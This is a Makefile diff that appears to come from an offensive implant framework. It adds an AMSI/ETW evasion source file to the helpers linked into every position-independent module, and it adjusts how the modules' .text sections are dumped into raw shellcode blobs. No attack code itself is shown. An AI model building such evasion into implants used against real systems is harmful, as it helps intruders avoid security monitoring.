@@ -108,7 +108,8 @@ stomper:
 # ── PIC Module building ─────────────────────────────────────────
 MODULE_DIR     := bin/modules
 MODULE_HELPERS := src/parser.cc src/package.cc src/strings.cc src/heap.cc \
-                  src/base64.cc src/intrinsics.cc src/resolve.cc src/crypto.cc
+                  src/base64.cc src/intrinsics.cc src/resolve.cc src/crypto.cc \
+                  src/evasion/amsi_etw.cc
 
 # Commands excluded from module builds (core + multi-handler sources)
 MOD_EXCLUDE := cmd_load.cc cmd_exit.cc cmd_sleep.cc cmd_config.cc \
@@ -148,7 +149,7 @@ modules-x64:
 	      $$HOBJS $(MODULE_DIR)/utils.x64.obj \
 	      -o $(MODULE_DIR)/$$name.x64.exe $(CFLAGS) $(CFLAGS_X64_INC) 2>/dev/null && \
 	    objcopy --dump-section .text=$(MODULE_DIR)/$$name.x64.raw $(MODULE_DIR)/$$name.x64.exe && \
-	    printf '\x00\x00\x00\x00' | cat - $(MODULE_DIR)/$$name.x64.raw > $(MODULE_DIR)/$$name.x64.bin && \
+	    printf '\000\000\000\000' | cat - $(MODULE_DIR)/$$name.x64.raw > $(MODULE_DIR)/$$name.x64.bin && \
 	    rm -f $(MODULE_DIR)/$$name.x64.raw $(MODULE_DIR)/$$name.x64.exe && \
 	    echo "    -> $$name.x64.bin" || \
 	    echo "    [SKIP] $$name (build failed)"; \
